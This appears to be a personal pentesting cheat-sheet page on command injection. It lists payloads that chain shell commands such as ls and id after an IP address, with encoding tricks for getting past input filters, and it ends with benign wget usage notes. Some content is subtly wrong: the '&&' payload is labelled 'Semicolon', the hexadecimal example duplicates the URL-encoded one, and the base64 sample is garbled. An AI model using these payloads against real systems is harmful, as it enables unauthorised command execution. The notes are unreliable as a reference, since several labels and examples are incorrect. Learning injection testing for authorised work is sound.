---
description: Can upload files revsre shell
---

# Command injection

## Basic Command Injection

The simplest way is by inserting a command separator to chain additional commands. These are typical in Unix-based systems, but Windows has its own variations.

**Semicolon (`;`)**: Executes commands sequentially.

```bash
127.0.0.1; ls
```

**Semicolon (`;`)**: Executes commands sequentially.

```bash
127.0.0.1 && id
```

**Double pipe (`||`)**: Executes the second command only if the first one fails.

```bash
127.0.0.1 || id
```

**Pipe (`|`)**: Sends the output of one command as the input to the next.

```bash
127.0.0.1 | ls
```

## Bypassing Input Filters

**Base64 Encoding**: Some filters might not check for base64-encoded payloads.

```bash
echo "LS0gY2F0IC9ldGMvYXBwYWdlX2ZpbGU=" | base64 -d
```

**URL Encoding**: Certain characters might be URL-encoded (`%3B` for `;`, `%26` for `&`, `%7C` for `|`).

```bash
127.0.0.1%3B id
```

**Double URL Encoding**: Encode characters multiple times to bypass filters that decode only once.

```bash
127.0.0.1%253B id
```

**Hexadecimal Encoding**: Some filters don't properly decode hexadecimal characters.

```bash
127.0.0.1%3B id
```

{% embed url="https://www.youtube.com/watch?v=kiP12PrXOZA" %}

## Wget

🔹 **Basic Syntax**

```bash
wget [options] [URL]
```

**Download a Single File**

```bash
wget https://example.com/file.zip
```

Download Multiple Files

```bash
wget -i urls.txt
```

⚙️ **FTP and Proxy Use**

Download from FTP with Credentials

```bash
wget ftp://username:password@ftp.example.com/file.txt
```

Use a Proxy

```bash
wget -e use_proxy=yes -e http_proxy=http://proxyserver:port https://example.com
```

🧪 **Advanced Usage**

Spider Mode (Check Links Without Downloading)

```bash
wget --spider https://example.com
```
